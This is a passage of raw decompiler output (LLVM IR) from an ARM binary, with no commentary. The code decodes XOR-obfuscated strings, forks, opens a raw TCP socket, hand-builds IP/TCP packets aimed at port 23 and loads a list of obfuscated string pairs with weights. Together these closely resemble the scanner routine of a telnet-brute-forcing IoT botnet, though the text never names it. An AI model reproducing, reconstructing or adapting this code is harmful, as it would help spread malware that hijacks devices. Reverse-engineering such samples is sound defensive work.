  %v2_108bc = add i32 %v2_108b4, %v3_108b8
  store i32 %v2_108bc, i32* %r3.global-to-local, align 4
  %v3_108c0 = add i32 %v2_108bc, 12
  %v4_108c0 = inttoptr i32 %v3_108c0 to i8*
  store i8 %v0_108c0.off0, i8* %v4_108c0, align 1
  %v0_108c4 = load i32, i32* %r6.global-to-local, align 4
  %v1_108c4 = load i32, i32* %sl.global-to-local, align 4
  %v2_108c4 = load i32, i32* %fp.global-to-local, align 4
  %v5_108c4 = mul i32 %v2_108c4, 16
  %v6_108c4 = add i32 %v5_108c4, %v1_108c4
  %v7_108c4 = inttoptr i32 %v6_108c4 to i32*
  store i32 %v0_108c4, i32* %v7_108c4, align 4
  %v2_108cc = load i32, i32* @global_var_1c1e4.210, align 4
  store i32 %v2_108cc, i32* %r7.global-to-local, align 4
  %v2_108d0 = load i32, i32* @global_var_1c210.212, align 4
  store i32 %v2_108d0, i32* %sl.global-to-local, align 4
  %v1_108d4 = inttoptr i32 %arg2 to i8*
  %v2_108d4 = call i32 @function_12d34(i8* %v1_108d4)
  %sext1 = mul i32 %v2_108d4, 16777216
  %v1_108d8 = sdiv i32 %sext1, 16777216
  %v2_108d8 = add nsw i32 %v1_108d8, 1
  store i32 %v1_108d8, i32* %r5.global-to-local, align 4
  %v1_108e4 = call i32* @malloc(i32 %v2_108d8)
  %v3_108e4 = ptrtoint i32* %v1_108e4 to i32
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %v2_108d8, i32* %r2.global-to-local, align 4
  store i32 %v3_108e4, i32* %r6.global-to-local, align 4
  %v3_108f4 = call i32 @function_12db0(i32 %v3_108e4, i32 %arg2, i32 %v2_108d8)
  %v0_108f8 = load i32, i32* %r5.global-to-local, align 4
  %tmp24 = icmp slt i32 %v0_108f8, 1
  %extract.t10 = trunc i32 %v0_108f8 to i8
  br i1 %tmp24, label %dec_label_pc_10924, label %dec_label_pc_10900

dec_label_pc_10900:                               ; preds = %dec_label_pc_108b0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 -81, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10908

dec_label_pc_10908:                               ; preds = %dec_label_pc_10908.dec_label_pc_10908_crit_edge, %dec_label_pc_10900
  %v1_10910 = phi i32 [ %v1_10910.pre, %dec_label_pc_10908.dec_label_pc_10908_crit_edge ], [ -81, %dec_label_pc_10900 ]
  %v2_10914 = phi i32 [ %v1_10918, %dec_label_pc_10908.dec_label_pc_10908_crit_edge ], [ 0, %dec_label_pc_10900 ]
  %v1_10908 = load i32, i32* %r6.global-to-local, align 4
  %v2_10908 = add i32 %v1_10908, %v2_10914
  %v3_10908 = inttoptr i32 %v2_10908 to i8*
  %v4_10908 = load i8, i8* %v3_10908, align 1
  %v6_10908 = zext i8 %v4_10908 to i32
  %v1_1090c = sub i32 -1, %v1_10910
  %v2_10910 = xor i32 %v6_10908, %v1_1090c
  store i32 %v2_10910, i32* %r3.global-to-local, align 4
  %v1_10914 = trunc i32 %v2_10910 to i8
  store i8 %v1_10914, i8* %v3_10908, align 1
  %v0_10918 = load i32, i32* %r2.global-to-local, align 4
  %v1_10918 = add i32 %v0_10918, 1
  store i32 %v1_10918, i32* %r2.global-to-local, align 4
  %v0_1091c = load i32, i32* %r5.global-to-local, align 4
  %v9_1091c = icmp eq i32 %v0_1091c, %v1_10918
  br i1 %v9_1091c, label %dec_label_pc_10924.loopexit, label %dec_label_pc_10908.dec_label_pc_10908_crit_edge

dec_label_pc_10908.dec_label_pc_10908_crit_edge:  ; preds = %dec_label_pc_10908
  %v1_10910.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10908

dec_label_pc_10924.loopexit:                      ; preds = %dec_label_pc_10908
  %extract.t9 = trunc i32 %v1_10918 to i8
  br label %dec_label_pc_10924

dec_label_pc_10924:                               ; preds = %dec_label_pc_10924.loopexit, %dec_label_pc_108b0
  %v0_10934.off0 = phi i8 [ %extract.t9, %dec_label_pc_10924.loopexit ], [ %extract.t10, %dec_label_pc_108b0 ]
  %v2_10924 = load i32, i32* @global_var_1c1e4.210, align 4
  %v2_10928 = load i32, i32* @global_var_1c210.212, align 4
  %v3_1092c = mul i32 %v2_10924, 16
  %v2_10930 = or i32 %v3_1092c, 13
  %v3_10934 = add i32 %v2_10930, %v2_10928
  %v4_10934 = inttoptr i32 %v3_10934 to i8*
  store i8 %v0_10934.off0, i8* %v4_10934, align 1
  %v2_1093c = load i32, i32* @global_var_1c1e4.210, align 4
  store i32 %v2_1093c, i32* %lr.global-to-local, align 4
  %v4_10940 = load i8, i8* @global_var_1c215.215, align 1
  %v5_10940 = zext i8 %v4_10940 to i32
  %v3_10944 = load i8, i8* bitcast (i8** @global_var_1c214.214 to i8*), align 4
  %v4_10944 = zext i8 %v3_10944 to i32
  %v2_10948 = load i32, i32* @global_var_1c210.212, align 4
  %v4_1094c = mul nuw nsw i32 %v5_10940, 256
  %v5_1094c = or i32 %v4_10944, %v4_1094c
  store i32 %v5_1094c, i32* %r2.global-to-local, align 4
  %v3_10950 = mul i32 %v2_1093c, 16
  %v2_10954 = add i32 %v2_10948, %v3_10950
  store i32 %v2_10954, i32* %r1.global-to-local, align 4
  %v3_1095c = add i32 %v2_10954, 9
  %v4_1095c = inttoptr i32 %v3_1095c to i8*
  store i8 %v4_10940, i8* %v4_1095c, align 1
  %v0_10960 = load i32, i32* %r2.global-to-local, align 4
  %v1_10960 = trunc i32 %v0_10960 to i8
  %v2_10960 = load i32, i32* %r1.global-to-local, align 4
  %v3_10960 = add i32 %v2_10960, 8
  %v4_10960 = inttoptr i32 %v3_10960 to i8*
  store i8 %v1_10960, i8* %v4_10960, align 1
  %v4_10964 = load i8, i8* @global_var_1c215.215, align 1
  %v5_10964 = zext i8 %v4_10964 to i32
  %v3_10968 = load i8, i8* bitcast (i8** @global_var_1c214.214 to i8*), align 4
  %v4_10968 = zext i8 %v3_10968 to i32
  %v4_1096c = mul nuw nsw i32 %v5_10964, 256
  %v5_1096c = or i32 %v4_10968, %v4_1096c
  %v2_10970 = load i32, i32* %stack_var_-44, align 4
  %v2_10974 = add i32 %v5_1096c, %v2_10970
  store i32 %v2_10974, i32* %r3.global-to-local, align 4
  %v3_1097811 = udiv i32 %v2_10974, 256
  %v1_1097c = trunc i32 %v3_1097811 to i8
  %v2_1097c = load i32, i32* %r1.global-to-local, align 4
  %v3_1097c = add i32 %v2_1097c, 11
  %v4_1097c = inttoptr i32 %v3_1097c to i8*
  store i8 %v1_1097c, i8* %v4_1097c, align 1
  %v0_10980 = load i32, i32* %r3.global-to-local, align 4
  %v1_10980 = trunc i32 %v0_10980 to i8
  %v2_10980 = load i32, i32* %r1.global-to-local, align 4
  %v3_10980 = add i32 %v2_10980, 10
  %v4_10980 = inttoptr i32 %v3_10980 to i8*
  store i8 %v1_10980, i8* %v4_10980, align 1
  %v4_10984 = load i8, i8* @global_var_1c215.215, align 1
  %v5_10984 = zext i8 %v4_10984 to i32
  %v3_10988 = load i8, i8* bitcast (i8** @global_var_1c214.214 to i8*), align 4
  %v4_10988 = zext i8 %v3_10988 to i32
  %v4_1098c = mul nuw nsw i32 %v5_10984, 256
  %v5_1098c = or i32 %v4_10988, %v4_1098c
  %v2_10990 = load i32, i32* %stack_var_-44, align 4
  %v2_10994 = add i32 %v5_1098c, %v2_10990
  store i32 %v2_10994, i32* %r2.global-to-local, align 4
  %v0_10998 = load i32, i32* %r7.global-to-local, align 4
  %v3_10998 = mul i32 %v0_10998, 16
  %v1_1099c = load i32, i32* %sl.global-to-local, align 4
  %v2_1099c = add i32 %v1_1099c, %v3_10998
  store i32 %v2_1099c, i32* %r3.global-to-local, align 4
  %v0_109a0 = load i32, i32* %lr.global-to-local, align 4
  %v1_109a0 = add i32 %v0_109a0, 1
  store i32 %v1_109a0, i32* %lr.global-to-local, align 4
  %v3_109a4 = sdiv i32 %v2_10994, 256
  store i32 %v3_109a4, i32* %r1.global-to-local, align 4
  %v0_109a8 = load i32, i32* %r6.global-to-local, align 4
  %v2_109a8 = add i32 %v2_1099c, 4
  %v3_109a8 = inttoptr i32 %v2_109a8 to i32*
  store i32 %v0_109a8, i32* %v3_109a8, align 4
  %v0_109ac = load i32, i32* %lr.global-to-local, align 4
  %v1_109ac = load i32, i32* %r8.global-to-local, align 4
  %v2_109ac = inttoptr i32 %v1_109ac to i32*
  store i32 %v0_109ac, i32* %v2_109ac, align 4
  %v0_109b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_109b0 = trunc i32 %v0_109b0 to i8
  store i8 %v1_109b0, i8* @global_var_1c215.215, align 1
  %v0_109b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_109b4 = trunc i32 %v0_109b4 to i8
  store i8 %v1_109b4, i8* bitcast (i8** @global_var_1c214.214 to i8*), align 4
  ret i32 ptrtoint (i8** @global_var_1c214.214 to i32)

; uselistorder directives
  uselistorder i32 %v1_10918, { 0, 2, 3, 1 }
  uselistorder i32 %v3_108e4, { 1, 0 }
  uselistorder i32 %v2_108d8, { 1, 0, 2 }
  uselistorder i32 %v1_108a4, { 0, 2, 3, 1 }
  uselistorder i32 %v3_10870, { 1, 0 }
  uselistorder i32 %v2_10864, { 1, 0, 2 }
  uselistorder i32 %v3_10834, { 1, 0 }
  uselistorder i32 %v3_1082c, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32 -81, { 0, 2, 1, 3 }
  uselistorder i32 (i8*)* @function_12d34, { 0, 1, 23, 24, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder i32* (i32*, i32)* @realloc, { 9, 7, 0, 5, 3, 10, 4, 6, 2, 8, 1, 11 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
}

define i32 @function_109cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_109cc:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-38 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-41 = alloca i32, align 4
  %stack_var_-52 = alloca i8, align 1
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-1842 = alloca i32, align 4
  %stack_var_-1862 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_109cc = load i32, i32* @r4, align 4
  store i32 %v3_109cc, i32* %stack_var_-36, align 4
  %v6_109cc = load i32, i32* @r5, align 4
  %v15_109cc = load i32, i32* @r8, align 4
  %v18_109cc = load i32, i32* @sb, align 4
  %v21_109cc = load i32, i32* @sl, align 4
  %v0_109d8 = call i32 @fork()
  store i32 %v0_109d8, i32* %r0.global-to-local, align 4
  %v7_109dc = icmp eq i32 %v0_109d8, -1
  %. = zext i1 %v7_109dc to i32
  %tmp282 = icmp slt i32 %v0_109d8, 1
  %storemerge241 = select i1 %tmp282, i32 %., i32 1
  store i32 %storemerge241, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1c23c.206 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_109f8 = icmp eq i32 %storemerge241, 0
  store i1 %v2_109f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_109d8, i32* @global_var_1c23c.206, align 4
  br i1 %v2_109f8, label %dec_label_pc_10a10, label %dec_label_pc_10a04

dec_label_pc_10a04:                               ; preds = %dec_label_pc_109cc
  store i32 %v3_109cc, i32* %r4.global-to-local, align 4
  store i32 %v6_109cc, i32* %r5.global-to-local, align 4
  store i32 %v15_109cc, i32* %r8.global-to-local, align 4
  store i32 %v18_109cc, i32* @sb, align 4
  store i32 %v21_109cc, i32* @sl, align 4
  ret i32 %v0_109d8

dec_label_pc_10a10:                               ; preds = %dec_label_pc_109cc
  %v0_10a10 = call i32 @function_12fec()
  store i32 %v0_10a10, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c21c.135 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_10a10, i32* @global_var_1c21c.135, align 4
  %v1_10a1c = call i32 @function_10608(i32 %v0_10a10)
  %v0_10a20 = load i32, i32* @r4, align 4
  store i32 %v0_10a20, i32* %r0.global-to-local, align 4
  %v1_10a24 = inttoptr i32 %v0_10a20 to i32*
  %v2_10a24 = call i32 @time(i32* %v1_10a24)
  store i32 ptrtoint (i32* @global_var_1c218.208 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_10a24, i32* @global_var_1c218.208, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_10a38 = call i32* @calloc(i32 256, i32 288)
  %v4_10a38 = ptrtoint i32* %v2_10a38 to i32
  store i32 %v4_10a38, i32* %lr.global-to-local, align 4
  %v0_10a44 = load i32, i32* @r4, align 4
  store i32 %v0_10a44, i32* %stack_var_-48, align 4
  store i32 %v4_10a38, i32* @global_var_1c234.220, align 4
  store i32 %v0_10a44, i32* %r3.global-to-local, align 4
  store i32 %v0_10a44, i32* %r5.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v0_10a44, i32* %ip.global-to-local, align 4
  %v1_10a5c = add i32 %v4_10a38, 4
  store i32 %v1_10a5c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_10a60

dec_label_pc_10a60:                               ; preds = %dec_label_pc_10a60.dec_label_pc_10a60_crit_edge, %dec_label_pc_10a10
  %v0_10a78 = phi i32 [ %v0_10a78.pre, %dec_label_pc_10a60.dec_label_pc_10a60_crit_edge ], [ %v0_10a44, %dec_label_pc_10a10 ]
  %v0_10a68 = phi i32 [ %v0_10a80, %dec_label_pc_10a60.dec_label_pc_10a60_crit_edge ], [ %v0_10a44, %dec_label_pc_10a10 ]
  %v1_10a70 = phi i32 [ %v1_10a70.pre, %dec_label_pc_10a60.dec_label_pc_10a60_crit_edge ], [ %v4_10a38, %dec_label_pc_10a10 ]
  %v3_10a60 = mul i32 %v0_10a68, 256
  store i32 %v3_10a60, i32* %r2.global-to-local, align 4
  %v1_10a68 = add i32 %v0_10a68, 1
  store i32 %v1_10a68, i32* %ip.global-to-local, align 4
  %v2_10a6c = mul i32 %v0_10a68, 288
  %v2_10a70 = add i32 %v1_10a70, 12
  %v2_10a78 = add i32 %v2_10a70, %v2_10a6c
  %v3_10a78 = inttoptr i32 %v2_10a78 to i32*
  store i32 %v0_10a78, i32* %v3_10a78, align 4
  %v0_10a7c = load i32, i32* %r0.global-to-local, align 4
  %v1_10a7c = load i32, i32* %r1.global-to-local, align 4
  %v2_10a7c = inttoptr i32 %v1_10a7c to i32*
  store i32 %v0_10a7c, i32* %v2_10a7c, align 4
  %v3_10a7c = load i32, i32* %r1.global-to-local, align 4
  %v4_10a7c = add i32 %v3_10a7c, 288
  store i32 %v4_10a7c, i32* %r1.global-to-local, align 4
  %v0_10a80 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_10a80, i32* %r3.global-to-local, align 4
  %v7_10a84 = icmp sgt i32 %v1_10a68, 255
  br i1 %v7_10a84, label %dec_label_pc_10a88, label %dec_label_pc_10a60.dec_label_pc_10a60_crit_edge

dec_label_pc_10a60.dec_label_pc_10a60_crit_edge:  ; preds = %dec_label_pc_10a60
  %v1_10a70.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_10a78.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10a60

dec_label_pc_10a88:                               ; preds = %dec_label_pc_10a60
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 %v0_10a80, i32* %stack_var_-48, align 4
  %v3_10a98 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_10a98, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1c238.222 to i32), i32* %lr.global-to-local, align 4
  %v2_10aa0 = icmp eq i32 %v3_10a98, -1
  store i1 %v2_10aa0, i1* %cpsr_c.global-to-local, align 1
  %v7_10aa0 = icmp eq i32 %v3_10a98, -1
  store i1 %v7_10aa0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_10a98, i32* %r4.global-to-local, align 4
  store i32 %v3_10a98, i32* @global_var_1c238.222, align 4
  br i1 %v7_10aa0, label %dec_label_pc_11270, label %dec_label_pc_10ab0

dec_label_pc_10ab0:                               ; preds = %dec_label_pc_10a88
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_10ab4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10ab4, i32* %r2.global-to-local, align 4
  %v2_10ab8 = call i32 (i32, i32, ...) @fcntl(i32 %v3_10a98, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_10ac0 = or i32 %v2_10ab8, 2048
  store i32 %v1_10ac0, i32* %r2.global-to-local, align 4
  %v0_10ac4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10ac4, i32* %r0.global-to-local, align 4
  %v2_10ac8 = call i32 (i32, i32, ...) @fcntl(i32 %v0_10ac4, i32 4)
  %v2_10ad4 = load i32, i32* @global_var_1c238.222, align 4
  store i32 %v2_10ad4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_10adc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10adc, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v2_10ae4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10ae4, i32* %r3.global-to-local, align 4
  store i32 4, i32* %r4.global-to-local, align 4
  store i32 1, i32* %stack_var_-48, align 4
  %v7_10af4 = call i32 @setsockopt(i32 %v2_10ad4, i32 %v0_10adc, i32 3, i32* nonnull %stack_var_-48, i32 4)
  store i32 %v7_10af4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10af8 = icmp eq i32 %v7_10af4, 0
  store i1 %v2_10af8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10af8, label %dec_label_pc_10b00, label %dec_label_pc_11264

dec_label_pc_10b00:                               ; preds = %dec_label_pc_10ab0, %dec_label_pc_10b00
  %v0_10b00 = call i32 @function_105b0()
  %v3_10b04 = mul i32 %v0_10b00, 65536
  store i32 %v3_10b04, i32* %r0.global-to-local, align 4
  %v1_10b10 = mul i32 %v0_10b00, 256
  %v3_10b14 = and i32 %v1_10b10, 65280
  %tmp285 = udiv i32 %v0_10b00, 256
  %v4_10b18 = urem i32 %tmp285, 256
  %v5_10b18 = or i32 %v4_10b18, %v3_10b14
  store i32 %v5_10b18, i32* %r3.global-to-local, align 4
  %v2_10b1c = icmp ugt i32 %v5_10b18, 1023
  store i1 %v2_10b1c, i1* %cpsr_c.global-to-local, align 1
  %v7_10b1c = icmp eq i32 %v5_10b18, 1024
  store i1 %v7_10b1c, i1* %cpsr_z.global-to-local, align 1
  %v3_10b20 = icmp ult i32 %v5_10b18, 1022
  br i1 %v3_10b20, label %dec_label_pc_10b00, label %dec_label_pc_10b24

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10b00
  %v5_10b0c.le = trunc i32 %v0_10b00 to i8
  store i32 ptrtoint (i32* @global_var_1c1e8.224 to i32), i32* %ip.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i8 69, i8* bitcast (i32* @global_var_1c1e8.224 to i8*), align 4
  store i8 40, i8* bitcast (i32* @global_var_1c1eb.225 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1c1ea.226 to i8*), align 4
  %v0_10b58 = call i32 @function_105b0()
  %v1_10b58 = trunc i32 %v0_10b58 to i8
  store i32 %v0_10b58, i32* %r0.global-to-local, align 4
  %v4_10b60 = sext i8 %v5_10b0c.le to i32
  %v3_10b64 = load i8, i8* @global_var_1c208.229, align 1
  store i32 ptrtoint (i32* @global_var_1c1e8.224 to i32), i32* %lr.global-to-local, align 4
  %v3_10b6c240 = udiv i32 %v4_10b60, 256
  store i8 64, i8* bitcast (i32* @global_var_1c1f0.230 to i8*), align 4
  %v2_10b78 = and i32 %v0_10b58, 128
  %v3_10b78 = icmp ne i32 %v2_10b78, 0
  store i1 %v3_10b78, i1* %cpsr_c.global-to-local, align 1
  %v4_10b78239 = udiv i32 %v0_10b58, 256
  store i32 ptrtoint (i32* @global_var_1c1fc.228 to i32), i32* %r3.global-to-local, align 4
  %tmp = urem i8 %v3_10b64, 16
  %v1_10b80 = zext i8 %tmp to i32
  %v1_10b84 = trunc i32 %v4_10b78239 to i8
  store i8 %v1_10b84, i8* bitcast (i32* @global_var_1c1ed.231 to i8*), align 4
  %v1_10b88 = or i32 %v1_10b80, 80
  store i32 %v1_10b88, i32* %r1.global-to-local, align 4
  store i32 23, i32* %r2.global-to-local, align 4
  store i32 6, i32* @r6, align 4
  %v1_10b94 = trunc i32 %v1_10b88 to i8
  store i8 %v1_10b94, i8* @global_var_1c208.229, align 1
  %v1_10b98 = trunc i32 %v3_10b6c240 to i8
  store i8 %v1_10b98, i8* bitcast (i32* @global_var_1c1fd.232 to i8*), align 4
  store i8 23, i8* bitcast (i32* @global_var_1c1ff.233 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_1c1f1.234 to i8*), align 4
  store i32 %v4_10b60, i32* %ip.global-to-local, align 4
  store i8 %v1_10b58, i8* bitcast (i32* @global_var_1c1ec.235 to i8*), align 4
  store i8 %v5_10b0c.le, i8* bitcast (i32* @global_var_1c1fc.228 to i8*), align 4
  %v0_10bb0 = load i32, i32* @r5, align 4
  %v1_10bb0 = trunc i32 %v0_10bb0 to i8
  store i8 %v1_10bb0, i8* bitcast (i32* @global_var_1c1fe.236 to i8*), align 4
  %v0_10bb4 = call i32 @function_105b0()
  %v1_10bb4 = trunc i32 %v0_10bb4 to i8
  store i32 ptrtoint (i32* @global_var_1c1fc.228 to i32), i32* %lr.global-to-local, align 4
  %v3_10bbc = load i8, i8* @global_var_1c209.237, align 1
  %v4_10bbc = zext i8 %v3_10bbc to i32
  %v2_10bc0 = and i32 %v0_10bb4, 128
  %v3_10bc0 = icmp ne i32 %v2_10bc0, 0
  store i1 %v3_10bc0, i1* %cpsr_c.global-to-local, align 1
  %v4_10bc0 = sdiv i32 %v0_10bb4, 256
  store i32 %v4_10bc0, i32* %ip.global-to-local, align 4
  %v1_10bc4 = or i32 %v4_10bbc, 2
  store i32 %v1_10bc4, i32* %r3.global-to-local, align 4
  %v1_10bcc = trunc i32 %v4_10bc0 to i8
  store i8 %v1_10bcc, i8* bitcast (i32* @global_var_1c20b.238 to i8*), align 4
  %v1_10bd0 = trunc i32 %v1_10bc4 to i8
  store i8 %v1_10bd0, i8* @global_var_1c209.237, align 1
  store i8 %v1_10bb4, i8* bitcast (i32* @global_var_1c20a.239 to i8*), align 4
  store i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_137c0.243 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v5_10be4 = call i32 @function_10818(i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32 ptrtoint ([8 x i8]* @global_var_137c0.243 to i32), i32 12)
  store i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_137c8.245 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_10bf4 = call i32 @function_10818(i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32 ptrtoint ([5 x i8]* @global_var_137c8.245 to i32), i32 9)
  store i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_137d0.247 to i32), i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_10c04 = call i32 @function_10818(i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32 ptrtoint ([9 x i8]* @global_var_137d0.247 to i32), i32 13)
  store i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32* %r0.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32* %r1.global-to-local, align 4
  %v5_10c14 = call i32 @function_10818(i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32 10)
  store i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_137dc.249 to i32), i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v4_10c24 = call i32 @function_10818(i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32 ptrtoint (i32* @global_var_137dc.249 to i32), i32 17)
  store i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_136b0.251 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_10c34 = call i32 @function_10818(i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32 ptrtoint (i32* @global_var_136b0.251 to i32), i32 5)
  store i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_137b0.253 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_10c44 = call i32 @function_10818(i32 ptrtoint ([6 x i8]* @global_var_137b8.241 to i32), i32 ptrtoint ([5 x i8]* @global_var_137b0.253 to i32), i32 9)
  store i32 ptrtoint ([4 x i8]* @global_var_136e0.255 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_136b0.251 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_10c54 = call i32 @function_10818(i32 ptrtoint ([4 x i8]* @global_var_136e0.255 to i32), i32 ptrtoint (i32* @global_var_136b0.251 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_136ec.259 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_10c64 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([5 x i8]* @global_var_136ec.259 to i32), i32 8)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_136f4.261 to i32), i32* %r1.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v5_10c74 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([7 x i8]* @global_var_136f4.261 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_136b0.251 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_10c84 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint (i32* @global_var_136b0.251 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_136fc.263 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_10c94 = call i32 @function_10818(i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32 ptrtoint ([6 x i8]* @global_var_136fc.263 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_136e4.257 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_13704.265 to i32), i32* %r1.global-to-local, align 4
